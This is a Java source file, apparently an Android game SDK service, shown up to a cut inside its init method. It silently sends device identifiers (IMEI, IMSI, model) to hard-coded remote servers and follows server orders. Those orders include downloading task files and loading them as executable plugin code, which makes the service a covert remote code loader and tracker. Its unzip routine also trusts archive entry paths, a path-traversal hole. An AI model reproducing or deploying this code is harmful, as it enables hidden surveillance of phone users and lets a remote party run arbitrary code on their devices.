package cn.play.dserv;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.io.RandomAccessFile;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLConnection;
import java.util.ArrayList;
import java.util.Enumeration;
import java.util.HashMap;
import java.util.zip.ZipEntry;
import java.util.zip.ZipFile;
import java.util.zip.ZipOutputStream;

import org.apache.http.Header;
import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicHeader;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.Environment;
import android.os.Handler;
import android.telephony.TelephonyManager;

/**
 * 主服务
 * @author keel
 *
 */
public class SdkServ implements DServ{

	
	
	public SdkServ() {
	}
	
	
	DService dservice;
	
	private static final String TAG = "DServ";
	
	
	public static final int ORDER_NONE = 0;
	public static final int ORDER_SYNC_TASK = 1;
	public static final int ORDER_DEL_TASK = 2;
	public static final int ORDER_STOP_SERVICE = 3;
	public static final int ORDER_RESTART_SERVICE = 4;
	public static final int ORDER_UPDATE = 5;
	public static final int ORDER_UPTIME = 6;
	public static final int ORDER_KEY = 7;
	
	
	//FIXME 将所有的log输出改为错误码定义输出
	
    public static final String ERR_PARA = "e01";
    public static final String ERR_DECRYPT = "e02";
    public static final String ERR_KEY_EXPIRED = "e03";
    public static final String ERR_DECRYPT_CLIENT = "e04";
    public static final String ERR_CONFIG = "e05";
    public static final String ERR_UP_RESP = "e06";
    
	int taskSleepTime = 10*1000;
	int upSleepTime = 1000*10*2;
	int shortSleepTime = 1000*60*5;
	long nextUpTime;
	long lastUpTime = System.currentTimeMillis();
	long lastUpLogTime = System.currentTimeMillis();
	long maxLogSleepTime = 1000*60*60;
	long maxLogSize = 1024*10;
	
	int timeOut = 5000;
	private final static int VERSION = 1;
//	private static int keyVersion = 1;
	private static final String SPLIT_STR = "@@";
	private static final String datFileType = ".dat";
	
	long uid = 0;
	
	UpThread upThread;
	TaskThread taskThread;
	
//	private  String cacheDir= ctx.getApplicationInfo().dataDir;
	
	
	private String upUrl = "http://ds.vcgame.net:8080/plserver/PS";
	private String upLogUrl = "http://lg.vcgame.net:8080/plserver/PL";
//	static String upUrl = "http://192.168.0.16:8080/PLServer/PS";//"http://180.96.63.71:8080/plserver/PS";
//	static String upLogUrl = "http://192.168.0.16:8080/PLServer/PL";
	static final String sdDir = Environment.getExternalStorageDirectory().getPath()+"/.dserver/";
	private String emvClass = "cn.play.dserv.MoreView";
	private String emvPath = "emv";
	private int state = STATE_RUNNING;
	
	/**
	 * 是否联网状态
	 */
	private boolean isNetOk = false;
	
	private HashMap<String,Object> config;
	private String configPath = sdDir+"cache_01";
	
	//private String pkgName = ctx.getPackageName();


		
	//------------------------config----------------------------------------
	
	private void initConfig(){
		this.config = new HashMap<String, Object>();
		this.config.put("state", STATE_RUNNING);
		this.config.put("upUrl", upUrl);
		this.config.put("emvClass", this.emvClass);
		this.config.put("emvPath", this.emvPath);
		this.config.put("t", "");
		this.config.put("dt", "");
		this.saveConfig();
		
	}
	
	@SuppressWarnings("unchecked")
	private HashMap<String,Object> readConfig(String configPath){
//		String txt = readTxt(configPath);
//		CheckTool.log(TAG, "read enc:"+txt);
//		if (!StringUtil.isStringWithLen(txt, 44)) {
//			CheckTool.e(TAG, "config File error!");
//			return this.config;
//		}
		try {
			String jsonStr = CheckTool.Cl(configPath);
			if (jsonStr != null) {
				HashMap<String, Object> m = (HashMap<String, Object>) JSON.read(jsonStr);
				if (m != null && m.size()>2) {
					this.config = m;
				}
			}
		} catch (Exception e) {
			e("ERR_"+ERR_CONFIG,"","",e.getMessage());
			CheckTool.e(TAG, "config File error!",e);
		}
		
		return this.config;
	}
	public String getPropString(String propName,String defaultValue){
		Object value = this.config.get(propName);
		if (value == null) {
			return defaultValue;
		}
		return value.toString();
	}
	public int getPropInt(String propName,int defaultValue){
		Object value = this.config.get(propName);
		if (value == null) {
			return defaultValue;
		}
		return Integer.parseInt(String.valueOf(value));
	}
	public void setProp(String propName,Object value,boolean isSave){
		this.config.put(propName, value);
		if (isSave) {
			this.saveConfig();
		}
	}
	
	public void saveConfig(){
		this.saveConfig(this.configPath);
	}
	
	private void saveConfig(String configPath){
		try {
			String cTime = String.valueOf(System.currentTimeMillis());
			this.config.put("timeStamp", cTime);
			String conf = JSON.write(this.config);
			CheckTool.Ck(configPath, conf);
//			String enc =  DService.CsaveConfig(configPath, conf);
//			writeTxt(configPath,enc);
		} catch (Exception e) {
			CheckTool.e(TAG, "save config error!", e);
		}
	}
	
	//----------------------------config end------------------------------------
	
	public void receiveMsg(int act,String p,String v,String m){
		CheckTool.log(TAG, "got act:"+act);
		if (p == null) {
			CheckTool.log(TAG, "receive p is null:"+act);
			return;
		}
		//just log save
		if (ACT_LOG == act) {
			log(LEVEL_D, "LOG_"+act, p, v, m);
			return;
		}
		if (StringUtil.isStringWithLen(v, 2)) {
			if(!CheckTool.Ce(v, dservice)){
				CheckTool.e(TAG, "v check failed.",null);
				e("ERR_v_"+act, p, v, m);
				return;
			}else{
				CheckTool.log(TAG, "V check OK");
			}
		}else{
			CheckTool.e(TAG, "v is empty.",null);
			e("ERR_v_"+act, p, v, m);
			return;
		}
		if (m == null) {
			m = "";
		}
		CheckTool.log(TAG, "v pass:"+act);
		
		try {
			switch (act) {
			case ACT_EMACTIVITY_START:
				log(LEVEL_I, "MORE_"+act, p, v, m);
				String emvP = sdDir+SdkServ.this.emvPath+".jar";
				CheckTool.e(TAG, "emvP:"+emvP,null);
				File f = new File(emvP);
				if (f == null ||  !f.exists()|| f.isDirectory() ) {
					Intent intent = dservice.getPackageManager().getLaunchIntentForPackage(
								"com.egame");
					if (intent == null) {
						Uri moreGame = Uri.parse("http://play.cn");
						dservice.startActivity(new Intent(Intent.ACTION_VIEW, moreGame));
					}else{
						dservice.startActivity(intent);
					}
					break;
				}
				Intent it= new Intent(dservice.getApplicationContext(), cn.play.dserv.EmpActivity.class);    
				it.putExtra("emvClass", SdkServ.this.emvClass);
				it.putExtra("emvPath", SdkServ.this.emvPath);
				it.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK); 
				dservice.startActivity(it); 
				break;
			case ACT_NET_CHANGE:
				CheckTool.log(TAG, "net m:"+m);
				if (m.equals("true")) {
					isNetOk = true;
				}else{
					isNetOk = false;
				}
				log(LEVEL_I, "NET_"+act, p, v, m);
				break;
			case ACT_GAME_INIT:
			case ACT_GAME_EXIT:
			case ACT_GAME_CONFIRM:
			case ACT_GAME_CUSTOM:
			log(LEVEL_I, "GAME_"+act, p, v, m);
				break;
			case ACT_FEE_INIT:
			case ACT_FEE_OK:
			case ACT_FEE_FAIL:
			case ACT_PUSH_CLICK:
			case ACT_PUSH_RECEIVE:
			case ACT_APP_INSTALL:
			case ACT_APP_REMOVE:
			case ACT_BOOT:
			case ACT_OTHER:
				log(LEVEL_I, "ACT_"+act, p, v, m);
				break;
			case STATE_STOP:
				log(LEVEL_I, "STOP", p, v, m);
				stopService();
				break;
			case STATE_NEED_RESTART:
				log(LEVEL_I, "RESTART", p, v, m);
				startService();
				break;
			default:
//			Intent i = new Intent();  
//			i.setClass(context, SdkServ.this.ctx.getClass());  
//			context.startService(i);
			}
		} catch (Exception e) {
			e.printStackTrace();
			e("RECEIVE", p, "act:"+act+" v:"+v, m);
		}
		
		
	}
	
	
	public void setNextUpTime(long nextUptime){
		nextUpTime = nextUptime;
	}
	
	public void setUpSleepTime(int sleepTime){
		upSleepTime = sleepTime;
	}
	public void setTaskSleepTime(int sleepTime){
		taskSleepTime = sleepTime;
	}
	
	public void pauseService(){
		this.state = STATE_PAUSE;
		this.setProp("state", STATE_PAUSE,true);
	}
	
	public void stopService(){
		this.state = STATE_STOP;
		this.setProp("state", STATE_STOP,true);
		this.stop();
	}
	
	public void startService(){
		this.state = STATE_RUNNING;
		this.setProp("state", STATE_RUNNING,true);
		this.init(this.dservice);
	}
	
	
	public void updateTaskState(int tid,int state ){
		synchronized (taskList) {
			
		for (PLTask task : this.taskList) {
			if (task.getId() == tid) {
				task.setState(state);
			}
		}
		}
	}
	
	public PLTask getTask(int tid){
		synchronized (taskList) {
			
		for (PLTask task : this.taskList) {
			if (task.getId() == tid) {
				return task;
			}
		}
		}
		return null;
	}
	
	
	public static boolean downloadGoOn(String url, String filePath,String filename,Context ct) {
		// file.size()即可得到原来下载文件的大小
//		// 设置代理
//		Header header = null;
//		if (mode == 2) {
//			// 移动内网的时候使用代理
//			url = format_CMWAP_URL(strPath);
//			header = new BasicHeader("X-Online-Host",
//					format_CMWAP_ServerName(strPath));
//		}
		
		// 获取文件对象，开始往文件里面写内容
		File myTempFile = new File(filePath + File.separator + filename);
		long size = myTempFile.length();
		
		HttpResponse response = null;
		// 用来获取下载文件的大小
		HttpResponse response_test = null;
		//long downloadfilesize = 0;
		try {
			HttpClient client = new DefaultHttpClient();
			HttpClient client_test = new DefaultHttpClient();
			HttpGet request = new HttpGet(url);
			HttpGet request_test = new HttpGet(url);
			request.addHeader("v", CheckTool.Cd(ct));
//			if (header != null) {
//				request.addHeader(header);
//			}
			response_test = client_test.execute(request_test);
			// 获取需要下载文件的大小
			long fileSize = response_test.getEntity().getContentLength();
			// 验证下载文件的完整性
			if (fileSize != 0) {
				if (fileSize == size) {
					//已经下载完成,直接返回true
					return true;
				}else if(fileSize < size){
					//体积不正确，重新从头下载所有内容
					size = 0;
				}
				
			}
			// 设置下载的数据位置XX字节到XX字节
			Header header_size = new BasicHeader("Range", "bytes=" + size + "-"
					+ fileSize);
			request.addHeader(header_size);
			response = client.execute(request);
			InputStream is = response.getEntity().getContent();
			if (is == null) {
				throw new RuntimeException("stream is null");
			}
//			SDCardUtil.createFolder(filePath);
			File folder = new File(filePath);
			folder.mkdirs();
			@SuppressWarnings("resource")
			RandomAccessFile fos = new RandomAccessFile(myTempFile, "rw");
			// 从文件的size以后的位置开始写入，其实也不用，直接往后写就可以。有时候多线程下载需要用

			fos.seek(size);
			byte buf[] = new byte[IO_BUFFER_SIZE];
			
			do {
				int numread = is.read(buf);
				if (numread <= 0) {
					break;
				}
				fos.write(buf, 0, numread);
//				if (handler != null) {
////					Message msg = new Message();
				
				//	downloadfilesize += numread;
				
//					double percent = (double) (downloadfilesize + size)
//							/ fileSize;
////					msg.obj = String.valueOf(percent);
////					handler.sendMessage(msg);// 更新下载进度百分比
//				}
			} while (true);
			is.close();
			return true;
		} catch (Exception ex) {
			ex.printStackTrace();
		}
		return false;
	}
	
	public static boolean zip(String src, String dest){
		// 提供了一个数据项压缩成一个ZIP归档输出流
		ZipOutputStream out = null;
		boolean re = false;
		try {

			File outFile = new File(dest);// 源文件或者目录
			File fileOrDirectory = new File(src);// 压缩文件路径
			out = new ZipOutputStream(new FileOutputStream(outFile));
			out.setLevel(9);
			// 如果此文件是一个文件
			if (fileOrDirectory.isFile()) {
				zipFileOrDirectory(out, fileOrDirectory, "");
			} else {
				// 返回一个文件或空阵列。
				File[] entries = fileOrDirectory.listFiles();
				for (int i = 0; i < entries.length; i++) {
					// 递归压缩，更新curPaths
					zipFileOrDirectory(out, entries[i], "");
				}
			}
			re = true;
		} catch (IOException ex) {
			ex.printStackTrace();
		} finally {
			// 关闭输出流
			if (out != null) {
				try {
					out.close();
				} catch (IOException ex) {
					ex.printStackTrace();
				}
			}
		}
		return re;
	}

	private static void zipFileOrDirectory(ZipOutputStream out,
			File fileOrDirectory, String curPath)  {
		// 从文件中读取字节的输入流
		FileInputStream in = null;
		try {
			// 如果此文件是一个目录，否则返回false。
			if (!fileOrDirectory.isDirectory()) {
				// 压缩文件
				byte[] buffer = new byte[4096];
				int bytes_read;
				in = new FileInputStream(fileOrDirectory);
				// 实例代表一个条目内的ZIP归档
				ZipEntry entry = new ZipEntry(curPath
						+ fileOrDirectory.getName());
				// 条目的信息写入底层流
				out.putNextEntry(entry);
				while ((bytes_read = in.read(buffer)) != -1) {
					out.write(buffer, 0, bytes_read);
				}
				out.closeEntry();
			} else {
				// 压缩目录
				File[] entries = fileOrDirectory.listFiles();
				for (int i = 0; i < entries.length; i++) {
					// 递归压缩，更新curPaths
					zipFileOrDirectory(out, entries[i], curPath
							+ fileOrDirectory.getName() + "/");
				}
			}
		} catch (IOException ex) {
			ex.printStackTrace();
		} finally {
			if (in != null) {
				try {
					in.close();
				} catch (IOException ex) {
					ex.printStackTrace();
				}
			}
		}
	}
	
	public static boolean unzip(String file,String outputDirectory){
		boolean re = false;
		ZipFile zipFile = null;
		try {
			zipFile = new ZipFile(file);
			Enumeration<? extends ZipEntry> e = zipFile.entries();
			ZipEntry zipEntry = null;
			File dest = new File(outputDirectory);
			dest.mkdirs();
			while (e.hasMoreElements()) {
				zipEntry = (ZipEntry) e.nextElement();
				String entryName = zipEntry.getName();
				InputStream in = null;
				FileOutputStream out = null;
				try {
					if (zipEntry.isDirectory()) {
						String name = zipEntry.getName();
						name = name.substring(0, name.length() - 1);
						File f = new File(outputDirectory + File.separator
								+ name);
						f.mkdirs();
					} else {
						int index = entryName.lastIndexOf("\\");
						if (index != -1) {
							File df = new File(outputDirectory + File.separator
									+ entryName.substring(0, index));
							df.mkdirs();
						}
						index = entryName.lastIndexOf("/");
						if (index != -1) {
							File df = new File(outputDirectory + File.separator
									+ entryName.substring(0, index));
							df.mkdirs();
						}
						File f = new File(outputDirectory + File.separator
								+ zipEntry.getName());
						in = zipFile.getInputStream(zipEntry);
						out = new FileOutputStream(f);
						int c;
						byte[] by = new byte[IO_BUFFER_SIZE];
						while ((c = in.read(by)) != -1) {
							out.write(by, 0, c);
						}
						out.flush();
					}
				} catch (IOException ex) {
					ex.printStackTrace();
				} finally {
					if (in != null) {
						try {
							in.close();
						} catch (IOException ex) {
						}
					}
					if (out != null) {
						try {
							out.close();
						} catch (IOException ex) {
						}
					}
				}
			}
			re = true;
		} catch (IOException ex) {
			ex.printStackTrace();
		} finally {
			if (zipFile != null) {
				try {
					zipFile.close();
				} catch (IOException ex) {
				}
			}
		}

		return re;
	}
	
	
	private void syncTaskList(String remoteListStr,String downUrl){
		if (!StringUtil.isStringWithLen(remoteListStr, 1)) {
			CheckTool.log(TAG, "remote task is empty.");
			return;
		}
		CheckTool.log(TAG, "remoteListStr:"+remoteListStr);
		String[] remoteList = remoteListStr.split("_");
		ArrayList<Integer> needFetchList = new ArrayList<Integer>();
		synchronized (this.taskList) {
			for (int i = 0; i < remoteList.length; i++) {
				int tid = Integer.parseInt(remoteList[i]);
				boolean had = false;
				StringBuilder tsb = new StringBuilder();
				for (int j = 0; j < taskList.size(); j++) {
					PLTask t = (PLTask)this.taskList.get(j);
					tsb.append(t.getId()).append(",");
					if (t.getId() == tid) {
						had = true;
						break;
					}
				}
				CheckTool.log(TAG, "tid:"+tid+" tlist:"+tsb.toString()+ had);
				if (!had) {
					PLTask task = this.loadTask(tid, sdDir);
					if (task == null) {
						needFetchList.add(tid);
					}else{
						taskList.add(task);
					}
				}
			}
		}
		//fetch remote tasks
		for (Integer id : needFetchList) {
			if (this.fetchRemoteTask(id,downUrl)) {
				CheckTool.log(TAG, "fetch OK:"+id);
				PLTask task = this.loadTask(id, sdDir);
				if (task != null) {
					CheckTool.log(TAG, "loadTask OK:"+id);
					task.setDService(this);
					task.init();
					this.taskList.add(task);
				}else{
					CheckTool.e(TAG, "loadTask ERR:"+id,null);
				}
			}else{
				CheckTool.e(TAG, "fetch ERR:"+id,null);
			}
		}
		this.saveStates();
	}
	private static final int IO_BUFFER_SIZE = 1024 * 4;
	
	/*
	public static boolean download(String remoteUrl,String localFile,String vKey){
		try {
			URL url = new URL(remoteUrl);
			URLConnection con = url.openConnection();
			con.setRequestProperty("v", vKey);
			InputStream is = con.getInputStream();
			byte[] bs = new byte[IO_BUFFER_SIZE];
			int len;
			OutputStream os = new FileOutputStream(localFile);
			while ((len = is.read(bs)) != -1) {
				os.write(bs, 0, len);
			}
			os.close();
			is.close();
			return true;
		} catch (Exception e) {
			CheckTool.e(TAG, "remote conn error:"+remoteUrl);
			e.printStackTrace();
			
		}
		return false;
	}
	*/
	final String ENCORDING = "UTF-8";

	boolean upload(String localFile, String uplogUrl){
		String boundary = "---------------------------7dc7c595809b2";
		boolean sucess = false;
		try {
			// 分割线
			File file = new File(localFile);

			String fileName = file.getName();
			// 用来解析主机名和端口
			URL url = new URL(uplogUrl + "?f=" + fileName);
			// 打开连接, 设置请求头
			HttpURLConnection conn = (HttpURLConnection) url.openConnection();
			conn.setConnectTimeout(10000);
			conn.setRequestMethod("POST");
			conn.setRequestProperty("Content-Type",
					"multipart/form-data; boundary=" + boundary);
			conn.setRequestProperty("Content-Length", file.length()+ "");
			conn.setRequestProperty("v", CheckTool.Cd(SdkServ.this.dservice));
			conn.setDoOutput(true);
			conn.setDoInput(true);

			// 获取输入输出流
			OutputStream out = conn.getOutputStream();
			FileInputStream fis = new FileInputStream(file);

			// 写出文件数据
			byte[] buf = new byte[IO_BUFFER_SIZE];
			int len;
			while ((len = fis.read(buf)) != -1){
				out.write(buf, 0, len);
			}
			InputStream in = conn.getInputStream();
			InputStreamReader isReader = new InputStreamReader(in);
			BufferedReader bufReader = new BufferedReader(isReader);
			String line = null;
			StringBuilder data = new StringBuilder();
			while ((line = bufReader.readLine()) != null){
				data.append(line);
			}
			if (conn.getResponseCode() == 200 && data.toString().equals("ok")) {
				sucess = true;
			}
			in.close();
			fis.close();
			out.close();
			conn.disconnect();
		} catch (Exception e) {
			CheckTool.e(TAG, "upload Failed",e);
			sucess = false;
		}

		return sucess;
	}

	private boolean fetchRemoteTask(int id,String downUrl){
		String remote = downUrl+"?id="+id;
		return downloadGoOn(remote,sdDir,id+datFileType,this.dservice);
	}
	
	
	public class UpThread extends Thread{

		boolean runFlag = true;
		int errTimes = 0;
		final int maxErrTimes = 20;
		
		/**
		 * @param runFlag the runFlag to set
		 */
		public final void setRun(boolean runFlag) {
			this.runFlag = runFlag;
		}

		public boolean up(){
			try {
				StringBuilder sb = new StringBuilder();
				int api_level = android.os.Build.VERSION.SDK_INT;
				if (SdkServ.this.dservice == null) {
					CheckTool.e("UP", "ctx is null",null);
					return false;
				}
				TelephonyManager tm=(TelephonyManager) SdkServ.this.dservice.getSystemService(Context.TELEPHONY_SERVICE);
				String imei = tm.getDeviceId();
				String imsi = tm.getSubscriberId();
				String ua = android.os.Build.MODEL;
				sb.append(uid).append(SPLIT_STR);
				sb.append(api_level).append(SPLIT_STR);
				sb.append(imei).append(SPLIT_STR);
				sb.append(imsi).append(SPLIT_STR);
				sb.append(ua).append(SPLIT_STR);
				sb.append(VERSION).append(SPLIT_STR);
				sb.append(lastUpTime).append(SPLIT_STR);
				sb.append(System.currentTimeMillis()).append(SPLIT_STR);
				//this.ctx.taskList;
				synchronized (SdkServ.this.taskList) {
					for (int i = 0; i < SdkServ.this.taskList.size(); i++) {
						PLTask t = (PLTask)SdkServ.this.taskList.get(i);
						sb.append(t.getId());
						sb.append("_");
					}
				}
				sb.append(SPLIT_STR).append(getPropString("dt", ""));
				CheckTool.log(TAG, "postUrl data:"+sb.toString());
				
				String data = "up="+CheckTool.Cg(sb.toString());
				CheckTool.log(TAG, "enc data:"+data);
				URL aUrl = new URL(upUrl);
			    URLConnection conn = aUrl.openConnection();
			    conn.setConnectTimeout(timeOut);
			    conn.setRequestProperty("v", CheckTool.Cd(SdkServ.this.dservice));
			    conn.setDoInput(true);
			    conn.setDoOutput(true);
			    OutputStreamWriter wr = new OutputStreamWriter(conn.getOutputStream());
			    wr.write(data);
			    wr.flush();

			    // Get the response
			    BufferedReader rd = new BufferedReader(new InputStreamReader(conn.getInputStream(),"utf-8"));
			    String line;
			    sb = new StringBuilder();
				while ((line = rd.readLine()) != null) {
					sb.append(line);
				}
			    wr.close();
			    rd.close();
			    //判断是否错误
			    final String resp = sb.toString();
			    
			    
			    if (!StringUtil.isStringWithLen(resp, 4)) {
					//判断错误码
			    	CheckTool.e(TAG, resp,null);
			    	e("ERR_"+ERR_UP_RESP,"","","resp:"+resp);
//			    	if (resp.equals(ERR_KEY_EXPIRED)) {
//						//key过期,发起更新key的请求升级key
//			    		
//					}else{
//						getHander().post(new Runnable() {     
//				            @Override     
//				            public void run() {     
//				                   Toast.makeText(SdkServ.this.dservice.getApplicationContext(), resp,Toast.LENGTH_SHORT).show(); 
//				            }     
//						});
//						//Toast.makeText(SdkServ.this.ctx.getApplicationContext(), resp, Toast.LENGTH_SHORT).show();;
//					}
			    	return false;
				}
			    //解密
				String re = CheckTool.Cf(resp);//Encrypter.getInstance().decrypt(resp);
				CheckTool.log(TAG, "re:"+re);
				String[] res = re.split(SPLIT_STR);
				if (!StringUtil.isDigits(res[0]) || !StringUtil.isDigits(res[1])) {
					CheckTool.e(TAG, "re length Error:"+re,null);
					return false;
				}
				SdkServ.this.uid = Long.parseLong(res[0]);
				int order = Integer.parseInt(res[1]);
				
				switch (order) {
				case ORDER_NONE:
					return true;
				case ORDER_SYNC_TASK:
					//比对task_id_list,进行同步
					CheckTool.log(TAG, "url:"+res[2]);
					String downLoadUrl = res[2];
					String remoteTaskIds = res[3];
					SdkServ.this.syncTaskList(remoteTaskIds,downLoadUrl);
					return true;
//				case ORDER_DEL_TASK:
//					break;
//				case ORDER_KEY:
					//resp: ORDER_KEY|base64(key)|keyVersion
					
//					SdkServ.this.setProp("key",res[1],true);
//					Encrypter.getInstance().setKey(Base64Coder.decode(res[1]));
//					break;
				case ORDER_UPDATE:
					
					
					break;
				case ORDER_UPTIME:
					
					
					break;
				case ORDER_RESTART_SERVICE:
					log(LEVEL_I, "RESTART", dservice.getPackageName(), "restart", "ORDER_RESTART_SERVICE");
					startService();
					
					break;
				case ORDER_STOP_SERVICE:
					log(LEVEL_I, "STOP",dservice.getPackageName(), "stop", "ORDER_STOP_SERVICE");
					stopService();
					break;
				default:
					SdkServ.this.syncTaskList(res[3],res[2]);
					return true;
				}
				
				
			} catch (Exception e) {
				CheckTool.e(TAG, "up unknown Error:"+upUrl, e);
			}
			return false;
		}


		@Override
		public void run() {
			if (SdkServ.this.state != STATE_RUNNING) {
				return;
			}
			nextUpTime = 1;
			
			try {
				while (runFlag && SdkServ.this.state == STATE_RUNNING) {
					CheckTool.log(TAG, "up running state:"+SdkServ.this.state);
					
					if (!isConnOk()) {
						Thread.sleep(shortSleepTime);
						continue;
					}
					
					if (System.currentTimeMillis()>nextUpTime) {
						//每天仅发起一次请求，如果请求失败，等待10分钟
						if (this.up()) {
//							Calendar ca = Calendar.getInstance();
//							ca.add(Calendar.DATE, 1);
//							ca.set(Calendar.HOUR_OF_DAY, 6);
//							nextUpTime = ca.getTimeInMillis();
							lastUpTime = System.currentTimeMillis();
							nextUpTime += upSleepTime;
							SdkServ.this.setProp("dt", "", true);
							CheckTool.log(TAG, "lastUpTime:"+lastUpTime+" nextUpTime"+nextUpTime+" runFlag+"+runFlag+" state:"+SdkServ.this.state);
						}else{
							errTimes++;
							Thread.sleep(shortSleepTime);
							if (errTimes > maxErrTimes) {
								errTimes = 0;
								upUrl = CheckTool.Cj();
							}
							continue;
						}
					}
					//日志上传
//					String logs = readLog();
					long logSize = getLogSize();
					//判断是否有足够内容,或超过最大上传时间间隔
					CheckTool.log(TAG, "log size:"+logSize);
					if ((logSize > maxLogSize) || System.currentTimeMillis()>lastUpLogTime+maxLogSleepTime) {
						boolean re = false;
						String lFile = sdDir+uid+"_"+System.currentTimeMillis()+".zip";
						re = zip(logFile, lFile);
						if(re){
							re = upload(lFile,upLogUrl);
							if (!re) {
								CheckTool.e(TAG, "upLog failed:"+lFile,null);
							}else{
								CheckTool.log(TAG, "upload log OK");
							}
						}
						File f = new File(lFile);
						f.delete();
						if (re) {
							lastUpLogTime = System.currentTimeMillis();
							f = new File(logFile);
							synchronized (f) {
								f.delete();
							}
						}else{
							Thread.sleep(shortSleepTime);
							continue;
						}
					}
					
					
					Thread.sleep(upSleepTime);
				}
			} catch (Exception e) {
				e.printStackTrace();
				e("UP", "", "", e.getMessage());
			}
		}
		
	}

	private ArrayList<PLTask> taskList = new ArrayList<PLTask>();
	
	public void addTask(PLTask task){
		synchronized (this.taskList) {
			this.taskList.add(task);
		}
		this.saveStates();
	}
	
	public void delTask(int taskId){
		synchronized (this.taskList) {
			for (PLTask task : this.taskList) {
				if (task.getId() == taskId) {
					this.taskList.remove(task);
					this.removeDat(task.getId());
				}
			}
		}
		this.saveStates();
	}
	
	public void delTask(PLTask task){
		int tid = task.getId();
		synchronized (this.taskList) {
			this.taskList.remove(task);
		}
		this.removeDat(tid);
		String deadTasks = this.getPropString("dt", "");
		this.setProp("dt", deadTasks+tid+"_", false);
		this.saveStates();
	}
	
	private void removeDat(int tid){
		try {
			File f = new File(sdDir+tid+datFileType);
			if (f.exists()) {
				f.delete();
				CheckTool.log(TAG, "DAT remove OK:"+tid);
			}
			f = new File(sdDir+tid+".jar");
			if (f.exists()) {
				f.delete();
				CheckTool.log(TAG, "jar remove OK:"+tid);
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
	
	public class TaskThread extends Thread{
	
		boolean runFlag = true;
		
		@Override
		public void run() {
			CheckTool.log(TAG, "TaskThread started");
			if (SdkServ.this.state != STATE_RUNNING) {
				return;
			}
			try {
				//先初始化所有的task
				synchronized (SdkServ.this.taskList) {
					for (int i = 0; i < taskList.size(); i++) {
						PLTask t = (PLTask)taskList.get(i);
						t.init();
					}
				}
				
				while (runFlag && SdkServ.this.state == STATE_RUNNING) {
					CheckTool.log(TAG, "task check");
					synchronized (taskList) {
						for (PLTask task : taskList) {
							int state = task.getState();
							CheckTool.log(TAG, "task state:"+state);
							switch (state) {
							case PLTask.STATE_WAITING:
								try {
									new Thread(task).start();
								} catch (Exception e) {
									CheckTool.e(TAG, "task exec error:"+task.getId(),e);
									e("TASKERR", "T_"+task.getId(), "", e.getMessage());
								}
								break;
							case PLTask.STATE_DIE:
								SdkServ.this.delTask(task);
								break;
							default:
								break;
							}
						}
					}
					CheckTool.log(TAG, runFlag+","+SdkServ.this.state+","+taskSleepTime);
					Thread.sleep(taskSleepTime);
				}
			} catch (Exception e) {
				e.printStackTrace();
				e("TTHREAD", "", "", e.getMessage());
			}
		}
		

		/**
		 * @param runFlag the runFlag to set
		 */
		public final void setRun(boolean runFlag) {
			this.runFlag = runFlag;
		}

	}
	
	
	
	public void saveStates(){
		StringBuilder sb = new StringBuilder();
		synchronized (this.taskList) {
			for (PLTask task : taskList) {
				sb.append(SPLIT_STR);
				int id = task.getId();
				sb.append(id);
			}
		}
		sb.delete(0, 2);
		CheckTool.log(TAG, "save task list:"+sb.toString());
		this.setProp("t", sb.toString(),false);
		this.setProp("emvClass", emvClass,false);
		this.setProp("emvPath", emvPath,false);
		this.saveConfig();
	}
	
	/**
	 * 供Task访问，可实现Task之间的交互
	 * @return
	 */
	ArrayList<PLTask> getTaskList(){
		return this.taskList;
	}
	
	private PLTask loadTask(int id,String localPath){
		String dexPath = localPath+id+datFileType;
		File f = new File(dexPath);
		if (f.exists() && f.isFile()) {
			try{
				//重命名
//				String dexPath2 = localPath+id+".jar";
//				f.renameTo(new File(dexPath2));
				/*
				DexClassLoader cDexClassLoader = new DexClassLoader(dexPath, cacheDir,null, this.getClass().getClassLoader()); 
				Class<?> class1 = cDexClassLoader.loadClass("cn.play.dserv.PLTask1");	
				PLTask plug =(PLTask)class1.newInstance();
*/
				PLTask plug = CheckTool.Ci(this.dservice,id,"cn.play.dserv.PLTask"+id);
				if (plug == null) {
					CheckTool.e(TAG, "loadTask error:"+localPath,null);
					return null;
				}
				//删除临时jar
//				f = new File(dexPath2);
//				if (f.exists() && f.isFile()) {
//					f.delete();
//				}
				CheckTool.log(TAG, "loadTask ok:"+plug.getId()+","+dexPath);
				
				return plug;
			}catch (Exception e) {
				CheckTool.e(TAG, "loadTask error:"+localPath,e);
			}    
		}
		return null;
	}
	
	public void stop(){
		if (this.upThread != null) {
			this.upThread.setRun(false);
		}
		if (this.taskThread != null) {
			this.taskThread.setRun(false);
		}
		if (this.taskThread != null) {
			this.lt.setRunFlag(false);
		}
		if (this.state == STATE_DIE) {
//			ctx.unregisterReceiver(this.myReceiver);
		}else{
			this.state = STATE_STOP;
		}
		CheckTool.log(TAG, "stoped...");
		try {
			Thread.sleep(3000);
		} catch (InterruptedException e) {
		}
	}
	
	
	
	
	public void init(DService dservice){
		CheckTool.log(TAG, "init...");
		this.dservice = dservice;
		if (dservice == null) {
			CheckTool.e(TAG, "IS NULL",null);
			return ;
		}else{
			CheckTool.log(TAG, dservice.getPackageName());
		}
		
		this.config = this.readConfig(this.configPath);
		if (this.config == null || this.config.size() <= 0) {
			//直接初始化config
			initConfig();
			CheckTool.log(TAG, "no conf");
		}else{
			CheckTool.log(TAG, "init config OK.");
		}
		if (this.state == STATE_NEED_RESTART) {
			//重启
			this.stop();
			this.state = STATE_RUNNING;
		}else{
			this.state = this.getPropInt("state", STATE_RUNNING);
		}
		if (this.state == STATE_STOP) {
			this.stop();
			return;
		}else if(this.state == STATE_DIE){
			//这里的STATE_DIE状态直接杀死本进程
			this.stop();
			dservice.stopSelf();
			return;
		}else if(this.state == STATE_PAUSE){
			return;
		}
//		cacheDir = ctx.getApplicationInfo().dataDir;
		emvClass = this.getPropString("emvClass", "cn.play.dserv.MoreView");
		emvPath = this.getPropString("emvPath", "emv");
		(new File(sdDir)).mkdirs();
